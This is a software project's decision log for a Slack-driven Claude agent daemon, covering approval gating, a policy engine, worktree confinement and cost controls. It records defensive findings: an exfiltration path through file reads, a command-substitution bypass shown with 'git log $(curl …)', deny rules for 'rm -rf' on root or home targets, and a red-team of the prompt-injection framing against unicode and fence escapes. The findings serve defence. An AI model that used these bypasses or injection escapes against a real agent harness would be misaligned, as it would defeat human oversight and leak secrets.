# DECISIONS.md

Log of decisions and verified facts, per DESIGN.md's process rules. Newest
last. Each entry: what was decided/learned, the evidence, and consequences.

## 2026-07-16 — Auth: subscription OAuth, no API key (verified)

**Decision:** Conduit authenticates via the dev machine's Claude subscription
(Max) login — not `ANTHROPIC_API_KEY`. There is no API key in this deployment.

**Evidence:** a headless `query()` via `@anthropic-ai/claude-agent-sdk`
(installed from npm, run on Node 24.12.0) succeeded with `ANTHROPIC_API_KEY`
and `CLAUDE_CODE_OAUTH_TOKEN` both unset; the SDK's bundled runtime used the
macOS keychain OAuth credentials from the machine's `claude` login. Captured
`session_id` from `system/init`, result subtype `success`, and
`total_cost_usd` was still reported (0.378 — notional API pricing, not billed
spend).

**Consequences:** DESIGN.md §4 (cost note), §6 (auth), §8 (prereqs, M0), and
Appendix B6 updated. Cost budgets are usage governance (plan rate limits), not
spend control. A headless box with no keychain login uses `claude setup-token`
→ `CLAUDE_CODE_OAUTH_TOKEN` (not yet needed, not yet tested).

**Open:** re-confirm the same under Bun (M0 exit criterion); before any
multi-user v1 deployment, check whether team-driven usage fits subscription
terms or needs an API key (revisit at M4).

## 2026-07-16 — Live-docs check: `PreToolUse` `defer` is real

Against https://code.claude.com/docs/en/agent-sdk/hooks.md:
`permissionDecision ∈ {allow, deny, ask, defer}`; "returning `defer` ends the
query so you can resume it later." New facts vs. DESIGN.md as written:
`updatedInput` is **ignored** with `defer`; when multiple hooks/rules apply,
precedence is `deny` > `defer` > `ask` > `allow`. The resume handshake has a
dedicated doc section ("Defer a tool call for later",
https://code.claude.com/docs/en/hooks#defer-a-tool-call-for-later) — not yet
read. The M0 spike still owes the working gated-resume proof; §9 open
question #1 (defer vs. `canUseTool`) remains open until then.

## 2026-07-16 — M0 complete: gate = `PreToolUse` `defer`; Bun is clean

**Decision:** gating uses `PreToolUse` returning `permissionDecision: "defer"`
(§9 #1 resolved). `canUseTool` is not needed for human-latency approvals; keep
it in reserve as the deny-by-default backstop for the batching caveat below.
No Bun blockers found (§9 #10 resolved) — the daemon stays on Bun.

**Spike:** two separate OS processes under Bun 1.3.14 (Homebrew install),
subscription OAuth, no API key, throwaway git repo. Scripts preserved in
`spikes/m0/` (to rerun: `bun add @anthropic-ai/claude-agent-sdk`, then
`bun run gate.ts`, then `bun run resume.ts`).

**Verified mechanics:**

- Gate phase: agent attempted `Write`; hook returned `defer`; query ended with
  `stop_reason` and `terminal_reason` both `"tool_deferred"`;
  `result.deferred_tool_use = {id, name, input}` (everything a Slack approval
  message needs); the file was NOT written; no process stayed alive.
- Resume phase (fresh process, after a delay): `query({ prompt: "", options:
  { resume: sessionId } })` re-drove the pending call through `PreToolUse`
  FIRST, with the **same `tool_use_id`** as `deferred_tool_use.id` —
  mechanical re-drive, not model re-generation. Hook returned `allow`; the
  tool executed; the turn ran to `terminal_reason: "completed"`. Same
  `session_id` across both processes. An empty prompt on resume is valid.
- Session storage landed at
  `~/.claude/projects/<encoded-cwd>/<session-id>.jsonl` exactly as Appendix B5
  describes — the cwd-keyed worktree-path-stability invariant is real.
- Bonus: the re-driven Write failed on a bad path (see fact 2 below); the
  error fed back and the agent recovered and completed correctly — the
  deny/error feedback loop works as designed.

**New facts / caveats for later milestones:**

1. **Batching:** per the live docs, if the model issues several tool calls in
   one batch, `defer` is ignored with a warning and the call takes the normal
   permission flow (resume can only re-drive one pending tool). M2's policy
   engine MUST keep a deny-by-default backstop behind the hook (e.g.
   `canUseTool` rejecting any gated call that reaches it).
2. **System prompt:** the SDK's default system prompt carries no environment
   context — the model didn't know its cwd and invented `/home/user/hello.txt`.
   The harness adapter should pass `systemPrompt: { type: "preset", preset:
   "claude_code" }` (+ appended Conduit protocol) so the agent knows its
   worktree. (The `cwd` option itself worked; the recovered write landed in
   the right repo.)
3. The gate-phase model issued the Write twice (both hook-deferred; the second
   became the preserved pending call). Harmless here, but the daemon must not
   assume exactly one hook firing per gated action — key approval records by
   `tool_use_id`.

## 2026-07-18 — Slack: custom slash commands cannot run inside threads

**Fact (contradicts DESIGN.md §2 journey 1 as written):** Slack does not offer
custom slash commands inside message threads — only at channel top level — and
the command payload carries no thread context. `/conduit assign` "in a thread"
is therefore impossible. Sources: Slack's implementing-slash-commands doc and
community reports (checked 2026-07-18).

**Decision (M1):** two assignment paths, both implemented in `adapters/slack/`:

- `/conduit assign [repo]` (top level) creates a **new** conversation: the
  adapter posts an anchor message and that message's `ts` becomes the thread
  root / `conversation_id`. Humans converse in the anchor's thread.
- `@Conduit assign` mentioned **inside an existing thread** assigns that thread
  (`app_mention` events do carry `thread_ts`). A top-level mention roots its
  own thread. `@Conduit stop` / `@Conduit status` are the thread-scoped forms;
  `/conduit stop` replies with a hint since it cannot know a thread.

**Consequences:** DESIGN.md §2 journey 1 and Appendix C updated. The
`ConversationRef` flow is unchanged — the core never knew about slash-command
mechanics.

## 2026-07-18 — Bun blocker in @slack/bolt v5: pinned to Bolt 4.x

**Failure (exact, per §6's record-the-failure rule):** `@slack/bolt@5.0.0` →
`@slack/socket-mode@3.0.0` sends its keepalive via undici's non-standard
`ping()` export; under Bun 1.3.14 the `undici` compat shim has no `ping`, so
every client ping throws `TypeError: (0, undici_1.ping) is not a function` and
socket-mode's catch handler calls `disconnect()` — a connect/disconnect loop.
Observed live on first daemon boot (2026-07-18).

**Decision:** pin `@slack/bolt@^4` (4.7.3 → `@slack/socket-mode@2.0.7`, which
uses the `ws` package; Bun supports `ws` natively). Verified: 35s live run,
Socket Mode connected, zero ping errors, clean SIGTERM shutdown. The App API we
use (command/event handlers, client, start/stop) is unchanged between v4/v5.
Revisit when Bun's undici shim grows `ping` or socket-mode drops the
undici-only path; the fallback hedge (Slack adapter in a Node child process
behind the surface port) remains available per §6.

## 2026-07-18 — M1 implementation decisions (daemon skeleton)

- **Read-only posture is enforced twice:** the harness adapter passes
  `allowedTools: [Read, Glob, Grep, TodoWrite]` and disallows the rest by bare
  name (removed from context), AND the session manager's M1 `GateFn` denies any
  tool outside that set via the `PreToolUse` hook. The double layer is
  deliberate — it seeds M2's deny-by-default backstop and keeps the harness
  port's gate contract real from the first commit.
- **The Conduit system-prompt append lives inside the opaque harness handle.**
  The SDK's `systemPrompt` is per-`query()` config, so resumed turns must
  re-supply it; storing it in the handle keeps the core ignorant of that
  mechanic (handle: `{v, sessionId, system}`, owned by `adapters/claude-code/`).
- **Smoke-verified (2026-07-18, Bun 1.3.14, subscription OAuth):** the real
  adapter created a session in a fresh worktree of the throwaway repo, gated
  every tool call, and a **separate process** resumed by handle and recalled
  the prior answer — the M1 park/resume loop works outside tests
  (`scripts/smoke-create.ts` / `smoke-resume.ts`).

## 2026-07-18 — M1 adversarial review: 41 confirmed findings, fixes applied

A six-dimension multi-agent review (ports, security, Slack, store, lifecycle,
SDK usage) with three-lens adversarial verification confirmed 41 findings
(15 refuted). Fixed the same day; the load-bearing ones:

- **Worktree confinement (security, high):** read-only tools could read ANY
  host file (`.env` tokens, the daemon DB) and post it into the thread — a
  clean exfiltration channel. The M1 gate now denies any Read/Glob/Grep whose
  path resolves outside the session's worktree (`pathConfined` in
  `core/session-manager.ts`; symlink-chasing is M3/M4 hardening).
- **Fail-closed gate (security, high):** a throwing GateFn used to fall
  through to the SDK permission system where `allowedTools` auto-approved the
  call. The `PreToolUse` hook now catches and answers `deny`.
- **Settings isolation (security):** `settingSources: []` on every `query()` —
  repo content (worktree `CLAUDE.md`, `.mcp.json`, `.claude/`) is untrusted
  input and must never register MCP servers or alter permissions.
- **Stop is now irreversible mid-turn (high):** the turn's cleanup only ever
  downgrades `active`→`parked`, and stop no longer deletes the per-session
  FIFO (stop → re-assign → message used to run two concurrent turns on one
  SDK session).
- **Delivery correctness:** a delivered reply is never overwritten by a late
  error; surface delivery failures fall back edit→post and are not confused
  with harness failures; harness attach errors surface in-thread.
- **Slack correctness:** conversation ids are now `channel:ts` (thread_ts is
  only unique per channel); strict mention-command parsing ("@Conduit take a
  look…" is conversation, not an assign); bounded dedup for Slack's
  at-least-once delivery; inline code spans protected in mrkdwn rendering.
- **A1 framing:** all Unicode line separators (\r, NEL, LS, PS) normalized
  before quoting so no content line can escape the `> ` prefix.
- **check-ports:** now also flags core files importing adapter modules by
  relative path (the probe that slipped through), with `src/daemon.ts`
  allowlisted as the composition root.
- Plus: dead-session-id recovery (resume failure restarts fresh instead of
  wedging the thread forever), a 10-minute turn inactivity watchdog with
  `interrupt()`, startup reconciliation parking crash-orphaned `active`
  sessions, `busy_timeout`, channel-scoped `/conduit status`, and
  `updatedInput` forwarded through the gate hook.

**Deliberately deferred** (logged, not bugs): append-mode progress for
`editMessages: false` surfaces (no such surface until adapter #2), worktree
orphan cleanup on assign races (M4), symlink-aware confinement (M3/M4),
render polish (URLs containing `)`, truncation mid-fence), turn duration
timestamps.

## 2026-07-18 — Development uses the real Slack workspace (architect decision)

**Decision (Chad, the architect/owner):** all Conduit development and testing
runs in the real company workspace, Acme (acme.slack.com) — not a
scratch workspace. Risks are known and accepted. This supersedes the
scratch-workspace clause of DESIGN.md §8's build-time safety rule.

**What is NOT lifted:** every other guardrail stands unchanged — sessions
point only at the throwaway git repo (`~/tmp/conduit-testrepo`), never a real
repo or deploy path until M4 hardening + gating review; deploy/land commands
ship as no-ops/`echo` first (M3); M1 sessions remain read-only and
worktree-confined. Practical mitigation: prefer a dedicated test channel so
session traffic doesn't land in working team channels.

**Consequences:** DESIGN.md §8 and CLAUDE.md updated. Sessions and future
Claude instances must not re-flag the workspace as a safety violation.

## 2026-07-18 — Repo registry: point Conduit at real repos by name

**Decision (architect request):** repos are registered in a gitignored
`conduit.repos.json` (array of `{name, path, defaultBranch?}`; path override
via `CONDUIT_REPOS_FILE`). The throwaway `testrepo` stays registered by
default; an entry named `testrepo` overrides it. `/conduit assign <name>`
resolves any registered repo. This pulls "real repo registration" forward
from post-M4 at the architect's request, for read-only M1 sessions.

**Why it's acceptable now:** sessions only ever see **committed content** —
each session works in a fresh `git worktree`, so the repo's working tree,
untracked files (`.env`, local configs), and ignored files are never visible
to the agent; M1 sessions are read-only with reads confined to the worktree.
Registered repos accumulate `conduit/*` branches + worktree registrations
(clean with `git worktree prune` and branch deletion). The deploy/land
no-op rule and M4 gating review still stand before any write access.

## 2026-07-18 — M2 SDK re-verification: precedence, batch backstop, canUseTool

Re-confirmed against the live docs (hooks.md, permissions.md, user-input.md)
before building the approval loop. The single-call defer→resume handshake was
already M0-proven; this settled the surrounding mechanics.

**Confirmed:**
- **Precedence:** hooks → deny rules → ask rules → permission mode → allow
  rules → `canUseTool`. A hook `deny` **terminates** (beats `allowedTools`), so
  read-only tools sit in `allowedTools` (auto-approve) while the `PreToolUse`
  hook still DENIES an out-of-worktree read. This is the M1 confinement design,
  now doc-confirmed.
- **Batch caveat:** `defer` is ignored for parallel batched tool calls; the
  gated call falls through toward `canUseTool`. `permissionMode: "default"`
  routes unmatched tools to `canUseTool`, so a deny-by-default `canUseTool`
  reliably catches a batched gated call regardless of the exact fallthrough
  step.
- **`canUseTool` contract:** `{behavior:"allow", updatedInput} | {behavior:
  "deny", message}`; signature `(toolName, input, {signal, suggestions})` — it
  receives **no** tool_use_id, so approval lookup keys off the hook path only.
  `updatedInput` is ignored on `defer`, honored on `allow`.

**Ambiguous in docs (handled defensively):** the exact batch-fallthrough step
and the permissionMode×defer interaction are not spelled out. Our design
(permissionMode `default` + matcher-less hook + `canUseTool` blanket-deny) is
correct under every documented interpretation.

**Empirical (M2 smoke, real SDK, two OS processes):** a `Write` gated →
deferred (`deferred_tool_use = {id,name,input}`, `terminal_reason
"tool_deferred"`), then a separate process resumed by handle, re-drove the same
`tool_use_id`, allowed it, and the Write executed with exact content. Scripts:
`scripts/smoke-gate.ts` / `smoke-gate-approve.ts` (`bun run smoke:gate` then
`smoke:approve`).

**Benign warning to expect:** every `query()` logs
`CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` ("canUseTool will not be invoked for
Read/Glob/Grep/TodoWrite"). This is EXPECTED and *validates* the design: reads
are auto-approved by `allowedTools` (and confined by the hook), so they never
reach the blanket-deny `canUseTool`; only gated tools do. (Ops nit: it prints a
stack each turn; quieting it is M3.)

**Observed (not a bug):** an empty-prompt approval-resume can emit two
`result`/`reply` messages; the daemon delivers both (a minor double-post).
Collapsing multiple replies per turn is M3 polish.

## 2026-07-18 — M2 complete: policy engine + defer-based approval loop

**Implementation (DESIGN.md §8 Milestone 2):** every tool call flows through an
approval-aware gate returning allow / gate / deny; a `gate` maps to the SDK
`defer`.

- **Policy engine** (`src/core/policy.ts`, pure `evaluate(call, ctx)`): hard-deny
  first (out-of-worktree reads/writes incl. Glob `pattern`; `rm -rf` with
  out-of-tree / home / root / `..` / `$` / `*` targets, dequoted; credential and
  secret paths, daemon env-var names), then auto-allow (read-only + confined;
  bash where every chained segment is allowlisted **and** free of command-
  substitution/redirect metacharacters), else gate. Unknown tools gate
  (deny-heavy default).
- **Approval lifecycle** is driven by the SDK's actual `deferred_tool_use` (a
  `deferred` TurnEvent), NOT by the hook firing — this sidesteps M0's
  "hook can fire twice" caveat. The manager records a pending approval, asks the
  surface to post Approve/Deny, and parks. An architect decision (re-verified
  **server-side**) resumes the session (empty-prompt turn) to re-drive the call;
  the gate answers allow/deny from the recorded approval. An **expired** approval
  (stop / reassign / undeliverable) re-drives as a clean deny — an abandoned
  gated action never re-gates or executes.
- **`canUseTool`** is a blanket deny-by-default backstop for the batching caveat
  (reads are shadowed from it, which is exactly why blanket-deny is safe).
- **Roles**: architect-only for assign / stop / approvals (DESIGN §2);
  conversing is open. Config is authoritative — `clearRoles` + reseed at boot
  from `CONDUIT_ARCHITECTS` / `conduit.roles.json`, so removing a principal
  actually revokes.
- **Deviation from DESIGN §4 examples (logged):** the DEFAULT safe-bash
  allowlist omits `cat`/`ls`. Auto-allowing them via Bash would bypass worktree
  read-confinement (Bash arg confinement is only heuristic in M2), so file reads
  go through the confined Read/Grep tools; a repo may opt cat/ls back in per
  repo. Positive Bash-arg confinement is M3/M4.

**Before the live M2 demo:** set `CONDUIT_ARCHITECTS=slack:U…` (or
`conduit.roles.json`). With no architect configured, assign/stop/approvals are
refused for everyone — the daemon logs a WARNING at boot.

**Verification:** 81 tests green, `tsc` clean, `check-ports` clean; the
real-harness smoke proves defer → approve → cross-process resume → execute.

## 2026-07-18 — M2 adversarial review: 10 confirmed findings, fixes applied

A six-dimension multi-agent review (authority/approval, policy, SDK,
concurrency, store, ports) with refute-by-default adversarial verification
confirmed 10 findings (9 refuted). Fixed same day (commit 11a37f7); regression
tests added. Load-bearing ones:

- **(high)** Bash auto-allow bypass via `$(...)`, backticks, and redirects
  (`git log $(curl …)` auto-allowed exfiltration): a segment with those
  metacharacters now never auto-allows — it goes to the gate.
- **(high)** Pending-approval TOCTOU: a message queued while a turn was still
  running (before it deferred) could stack a spurious turn onto the deferred
  session and duplicate the approval. Re-checked at **execution** time inside
  the per-session FIFO, not just at enqueue.
- **(med)** Failed approval post / stop / reassign left an approval `pending`
  forever (wedging the session): expire them; a re-driven expired approval
  cleanly denies.
- **(med)** `rm -rf` quoted/embedded targets degraded deny→gate; Glob `pattern`
  escaped read confinement; a stop landing during the placeholder post could
  resurrect the session (fixed with atomic `tryActivate`); roles were
  seed-only, so removing an architect never revoked (config-authoritative now).
- **(low)** Fresh-retry on a failed empty-prompt approval-resume would silently
  drop the approved action — disabled for empty prompts.

**Deliberately deferred** (documented, not a bug): a batched gated call is
audited as `tool_call decision=gate` although `canUseTool` then denies it — the
adapter has no store handle to audit the backstop denial, and the case is rare
(the model must batch a gated call); revisit when auditing moves behind the
harness port in M3.

## 2026-07-18 — Fix: system prompt is core policy, re-supplied on resume

**Symptom (found in the live M2 demo):** an M1 session (`acme`, read-only)
was reactivated under M2; when asked to create a file it refused — "I'm in
read-only mode this milestone." The M2 approval loop never fired because the
agent never attempted the write.

**Root cause:** the M1 design froze the Conduit system-prompt append inside the
opaque harness handle at `create()` time. On resume the adapter replayed that
stored string — for this session, the **M1 read-only prompt** (confirmed by
reading `harness_session_handle.system` in the DB). So the M2 `conduitSystemPrompt`
reached only newly-created sessions; every pre-existing session kept its old
posture.

**Fix:** the system prompt is Conduit **policy**, not adapter session state, so
the core now supplies the current prompt on **both** create and resume
(`HarnessAdapter.resume(handle, cwd, system)`); the handle no longer carries it
(legacy handles' `system` field is ignored). A reactivated session now gets the
current posture. Regression test in `session-manager.test.ts`. This supersedes
the M1 note "the Conduit system-prompt append lives inside the opaque harness
handle."

**Caveat for the demo:** the fix corrects the *prompt*, but a reactivated
session's transcript still contains its prior read-only exchanges, which prime
the model. For a clean M2 write demo, start a **fresh** thread.

**Build-time-safety reminder (still in force):** M2 write-gating must be
demoed against the **throwaway `testrepo`**, not a real registered repo like
`acme`. The 2026-07-18 repo-registry decision registered real repos for
**read-only** M1 exploration and explicitly kept "no write access to real repos
until M4 hardening + gating review." Gated writes land in an isolated
`conduit/*` worktree branch, but the guardrail is deliberately conservative —
use `/conduit assign` (defaults to `testrepo`) for the write demo.

## 2026-07-18 — M3 SDK re-verification (budget, result subtypes, terminal reasons)

Re-confirmed against the installed `@anthropic-ai/claude-agent-sdk` types
(`sdk.d.ts`) before wiring cost governance:

- **`maxBudgetUsd?: number`** is a real `query()` option: "the query will stop
  if this budget is exceeded, returning an `error_max_budget_usd` result."
- **`SDKResultMessage = SDKResultSuccess | SDKResultError`.** *Success* carries
  `result`, `total_cost_usd`, `deferred_tool_use?`, `terminal_reason?`. *Error*
  subtypes are `error_during_execution | error_max_turns | error_max_budget_usd
  | error_max_structured_output_retries` and STILL carry `total_cost_usd` (and
  `errors: string[]`) but no `result`/`deferred_tool_use`. So a budget-exhausted
  turn reports its spend — the cost ledger must count error results, not only
  successes.
- **`TerminalReason`** includes `budget_exhausted`, `tool_deferred`, and
  `tool_deferred_unavailable` (the batching caveat has its own terminal reason).

Consequence: the adapter records `total_cost_usd` on every result (success,
deferred, error) and maps `error_max_budget_usd`/`budget_exhausted` to a clear
in-thread notice, never a silent stall.

## 2026-07-18 — M3 complete: real work end-to-end

**Implementation (DESIGN.md §8 Milestone 3).** Six workstreams, each independently
demoable; 115 tests green, `tsc` + `check-ports` clean; real-harness smokes pass
(gate→approve→resume; 4 concurrent in-process sessions in ~8s).

1. **Per-repo test/land/deploy + cost cap.** `RepoConfig`/store/config carry
   `testCmd`, `landCmd`, `deployCmd`, `costCapUsd`; sessions carry
   `budget_limit_usd`. testrepo ships `bun test` and **echo/no-op** land/deploy
   (build-time safety — real deploy path is M4).
2. **Land/deploy = daemon-owned, gated action.** `@Conduit land`/`deploy`
   (architect-only) records a `conduit:land`/`conduit:deploy` approval and posts
   Approve/Deny (§4: the deploy path is a gated action, so an explicit click is
   required even though the ordering architect is verified). On approval the
   **daemon** runs exactly the repo's configured command via a core
   `CommandRunner` in the worktree — NEVER the agent's shell, so the command is
   authoritative config, not agent-chosen — audited as a `deploy` event, with the
   daemon's own secrets scrubbed from the child env. The agent may *propose*
   landing but cannot run it.
3. **Test command auto-allowed.** The repo's `testCmd` is folded into the
   effective bash allowlist at turn time (NOT into the stored allowlist, so config
   stays pristine and cost/prod checks still apply to everything else), so the
   agent verifies its own work without approval; it's surfaced in the system
   prompt.
4. **Cost budgets + runaway cap (two layers).** (a) The manager blocks a new
   human turn once cumulative `total_cost_usd` reaches the thread budget, pauses,
   and pings the architect; recovery is `@Conduit budget <usd>` (architect-only).
   (b) The SDK `maxBudgetUsd` is set to the remaining headroom per turn as an
   intra-turn brake; `error_max_budget_usd` surfaces as a clear notice.
   Approval-resume turns are NOT budget-blocked (never strand an approved action).
5. **Concurrency (§7).** A daemon-wide semaphore bounds concurrent harness turns
   (default 6; the per-session FIFO still serializes each thread). In-process
   `query()` concurrency verified under real load — child-process isolation
   stays a later (M4+) call, not needed here.
6. **Injection framing hardening (Appendix A1).** A four-lens adversarial
   red-team confirmed the three layers hold (header-only authority + unforgeable
   random-nonce body fence + line quoting) and net authority-forge is backstopped.
   Closed the gaps it surfaced: defang the literal `[conduit:` protocol sentinel
   in body content (kills the one residual quoting-layer escape — a model
   un-escaping a literal `\n`); fold info separators FS/GS/RS/US into line-break
   normalization; add bidi MARKS ALM/LRM/RLM to the strip set. Emoji ZWJ
   preserved.
7. **Production-data gate (§4, Appendix A3).** The policy engine recognizes
   production-data access (prod DB clients, app consoles, cloud data/log CLIs),
   gates it like a build even when read-only, and — crucially — it can **never be
   auto-allowlisted away** (the check sits above the allowlist, below hard-deny).
   The `production-data` concern threads to the gate audit and the approval prompt
   (Slack renders a warning); the system prompt adds the **aggregates-only** rule.
   Real prod creds are M4; M3 is policy + prompt + audit.

**New commands:** `@Conduit land`, `@Conduit deploy`, `@Conduit budget <usd>`
(all architect-only, thread-scoped mentions).

**Deviation / notes.** Land/deploy require an explicit Approve click even though
an architect issued the command — deliberate belt-and-braces for the most
dangerous action, matching §4's "the deploy path ... posts Approve/Deny." The
`@`-mention ping of specific architects on a budget stall is a plain in-thread
notice for now (surface-specific mention rendering is a later refinement).

## 2026-07-18 — M3 framing red-team + adversarial review: findings fixed

Two multi-agent adversarial passes, matching the M1/M2 process.

**Framing red-team (four lenses: linebreak / fence / header / unicode).**
Confirmed the three-layer model holds (header-only authority + unforgeable
random-nonce body fence + line quoting) and net authority-forge is backstopped.
One residual quoting-layer escape and two completeness gaps were closed (literal
`\n` un-escape → defang the `[conduit:` sentinel; info separators FS/GS/RS/US into
line-break normalization; bidi MARKS ALM/LRM/RLM into the strip set). Emoji ZWJ
preserved. (Commit 1e56e9a.)

**Six-dimension review (authority/approval, policy/prod-data, cost, concurrency/
lifecycle, harness/SDK, command-runner, framing/ports) with refute-by-default
verification.** 6 of 8 candidates survived; all fixed:

- **(high)** `CommandRunner.run()` could hang forever if a killed shell's
  surviving child kept the pipe open (awaiting stream EOF), leaking the turn slot
  and wedging the session/daemon. Now races the read against a hard deadline and
  SIGKILLs — `run()` always settles within the timeout.
- **(med)** Output was read to EOF before the byte cap (unbounded peak memory,
  OOM risk). Now read with a per-stream byte cap that STOPS at the cap.
- **(med)** An approval-resume turn near the budget got a tiny `maxBudgetUsd`,
  which could stop it (`error_max_budget_usd`) and strand the just-approved
  action. Only inbound human turns are capped now; resume turns run uncapped.
- **(med)** A `stop` landing while a turn waited on the concurrency semaphore
  still ran a full turn on the stopped session. `tryActivate` now claims the turn
  AFTER acquiring the slot, so a stop during the wait aborts it.
- **(low)** `productionDataConcern` missed env-var/`sudo`/`timeout` prefixes
  (`PGPASSWORD=x psql`, `sudo -u pg psql`). Now skips prefixes + a fallback scan.

Two candidates were refuted (a claimed missing guard that already existed; an
env-denylist-vs-allowlist design point — deliberate, since a real deploy needs
most of the env). Regression tests added for each fix; 124 tests green, `tsc` +
`check-ports` clean; the real-harness gate→approve→resume and 4-way concurrency
smokes pass.

## 2026-07-18 — Milestone 3.5 planned: expose full Claude Code power to the thread

**Product driver (sharpens §1).** The north-star for Conduit is empowering people
with **domain expertise but not coding skill — product managers first — to build
features themselves** via Slack, with a software engineer (the architect) guiding
and gating in the *same thread*. For that to be real the implementer must be a
first-class Claude Code agent, not a constrained toy. The M3 adapter pins none of
the levers (default model, default effort, `Agent`/`Task` disallowed,
`settingSources: []`), so this is a dedicated milestone **before M4**.

**SDK capability verification (authoritative, via the Claude Code SDK-guide
against live docs; re-confirm exact IDs before building).**

- **Model:** `query({ options: { model } })` accepts exact IDs —
  `claude-opus-4-8`, `claude-fable-5`, `claude-sonnet-5`. Unset = CLI default.
- **Effort:** `options.effort ∈ {low, medium, high, xhigh, max}`, *independent* of
  extended thinking. `xhigh` needs Fable 5 / Opus 4.8·4.7 / Sonnet 5; `max` also
  Opus 4.6 / Sonnet 4.6. Unset = model default (~high).
- **Subagents are GATEABLE (the load-bearing finding):** per the hooks doc, a
  `PreToolUse` hook fires **inside subagents too**, with `agent_id`/`agent_type`
  on the hook input. So enabling the `Agent`/`Task` tool does NOT bypass our gate
  — every subagent `Write`/`Bash` still hits it. Defense-in-depth: a subagent can
  be given a restricted `tools` list. **Caveat to spike:** hooks *firing* proves
  we can allow/deny a subagent call synchronously; our defer→Slack-approval→resume
  loop re-driving a *subagent-initiated* pending call is M0-proven only for the
  main agent — run an M0-style spike before shipping Tier B.
- **"ultracode" is CLI-only, not an SDK flag.** It is `xhigh` effort + standing
  permission to launch multi-agent workflows. Reproduce at the SDK with
  `effort:"xhigh"` + the `Agent`/`Workflow` tools (the `Workflow` tool exists in
  our SDK ≥0.3.149; we run 0.3.214).
- **`settingSources`:** `[]` disables project/user `CLAUDE.md`, skills, project
  hooks/settings/MCP, local settings (loads managed policy, `~/.claude.json`, auto
  memory, claude.ai MCP regardless). `settingSources:["project"]` (+ `skills:"all"`)
  selectively loads a repo's config while the `PreToolUse` gate still applies —
  but it also loads that repo's permissions/hooks/MCP, so it is **trust-scoped**
  (opt-in per repo). Daemon-defined programmatic `agents`/`mcpServers` avoid repo
  trust entirely and are preferred where they fit.

**Decision.** Add **Milestone 3.5 — Full Claude Code power in the thread** to
DESIGN.md §8 (before M4), built in tiers: A model+effort (safe, first), B
subagents/workflows + an `ultra` preset (architect opt-in, default off, gated,
spike first), C skills/project config (trust-scoped). All exposed as architect
in-thread commands, all behind the §4 gate; the harness port carries model/effort/
capability flags as config the core persists and passes through (never core
policy). Include a way to dial capability *down* — model×effort×subagents spend
the subscription plan's **rate limit**, the real constraint (cost budgets are
notional). **Not yet implemented** — this entry records the plan + verified facts.

## 2026-07-18 — M3.5 Tier A shipped + Tier B spike: subagent defer does NOT resume

**Tier A (model + effort) — done.** Per-session `model`/`effort` columns (opaque
tokens) with per-repo defaults (`conduit.repos.json`) + a daemon-wide default of
**Opus + high** (DESIGN §1: a first-class implementer). Architect commands
`@Conduit model <opus|sonnet|fable>` / `effort <low…max>` (architect-only, audited),
shown in intro/status/help. Ports stayed clean: the core validates a choice by
membership in `HarnessCapabilities.supportedModels/supportedEfforts` and forwards
the opaque token via `TurnInput.harness`; the **claude-code adapter** is the only
place that knows SDK ids (`opus→claude-opus-4-8`, `sonnet→claude-sonnet-5`,
`fable→claude-fable-5`) and applies `effort`. Also hardened the default posture:
both `Agent` **and** `Task` (+`Workflow`) are now disallowed by default (was
`Task`-only — see the spike's tool-name finding). Verified by `smoke:model` on live
subscription auth: Opus/high then a mid-session switch to Fable/low apply cleanly.

**SDK re-verification (installed `@anthropic-ai/claude-agent-sdk` 0.3.214, against
`sdk.d.ts`).** All facts confirmed: `Options.model?: string` (its own docstring
examples are `claude-opus-4-8`/`claude-sonnet-5`/`claude-fable-5`);
`Options.effort?: EffortLevel = low|medium|high|xhigh|max` (default high; `xhigh`
needs Fable 5 / Opus 4.7+ / Sonnet 5 — our Opus qualifies — silently falls back to
`high` elsewhere); `settingSources?: ('user'|'project'|'local')[]` (`[]` isolates,
`'project'` needed for CLAUDE.md); `skills?: 'all' | string[]`;
`agents?: Record<string, AgentDefinition>` (per-subagent `tools`/`effort`/`model`,
daemon-defined, no repo trust); `mcpServers`. `BaseHookInput` carries
`agent_id`/`agent_type` ("present only when the hook fires from within a subagent").

**Tier B spike (two phases, real SDK, subscription auth) — the load-bearing test
BEFORE building Tier B. Scripts in `spikes/m3.5/`.**

- **The subagent tool is named `Agent`** (the model emitted `Agent`, not the legacy
  `Task`). So disabling subagents requires disallowing **both** names (done).
- **The `PreToolUse` gate fires inside a subagent** — a subagent's `Write` hit the
  hook with `agent_id` set and `agent_type: "writer"`. Subagent tool calls are
  gateable exactly as claimed; enabling subagents does NOT bypass the gate.
- **BUT `defer` on a subagent-initiated call does NOT produce a resumable pending
  call.** Phase 1: the subagent's `Write` was deferred → the file was NOT written
  (fail-safe), but the query ended `terminal_reason: "completed"` with
  `deferred_tool_use: null` — nothing to resume. **`defer`/resume is a main-thread
  mechanism.** The M0 defer→approve→resume loop works only for the main agent.
- **Phase 2 validated the corrected Tier B mechanism** (`subagent-deny.ts`): a
  subagent READ hit the hook (`agent_id` set) and was allowed + confined; a subagent
  WRITE was **denied** cleanly (query completed, no hang); the **main agent** then
  performed the write itself. This is the intended flow.

**Decision (Tier B design, spike-driven).** Subagents are enabled as **read-only
parallel fan-out** for exploration/analysis. Their reads flow through the gate
(allowed + worktree-confined, `agent_id`-tagged). Any subagent-initiated **gated**
action (write/edit/bash/network) or **nested spawn** is **DENIED** in the policy
engine (fail-closed, with feedback telling the model the main agent must do it),
because defer→resume can't pause a subagent call. The **main agent** performs all
mutations via the M0-proven defer→approve→resume path. Defense-in-depth: daemon-side
`agents` give subagents a read-only default toolset, and the deny-in-policy backstop
catches any subagent (built-in type or Workflow-spawned) that still reaches for a
gated tool. The `ultra` preset = `xhigh` + subagents + the `Workflow` tool; its
orchestrated sub-agents obey the same subagent gate.

## 2026-07-18 — M3.5 complete: full Claude Code power in the thread

**Implementation (DESIGN.md §8 Milestone 3.5).** Three tiers, each independently
demoable; 168 tests green, `tsc` + `check-ports` clean; real-SDK smokes pass
(`smoke:model`, `smoke:subagents`) plus the two-phase subagent spike.

1. **Tier A — model + effort.** Per-session `model`/`effort` (opaque tokens) with
   per-repo defaults + a daemon-wide default of **Opus + high**. Commands
   `@Conduit model <opus|sonnet|fable>` / `effort <low…max>` (architect-only,
   audited); surfaced in intro/status/reactivation/help. The core validates by
   membership against `HarnessCapabilities.supportedModels/supportedEfforts` and
   forwards the token via `TurnInput.harness`; the adapter maps to SDK ids and
   applies effort. Verified live (`smoke:model`).
2. **Tier B — subagents + workflows + `ultra`.** Architect opt-in, default off:
   `@Conduit subagents on|off`, `@Conduit ultra on|off` (= xhigh + subagents +
   Workflow tool). Spike-driven design (previous entry): subagents fan out
   **read-only**; a subagent-initiated gated action or nested spawn is **denied**
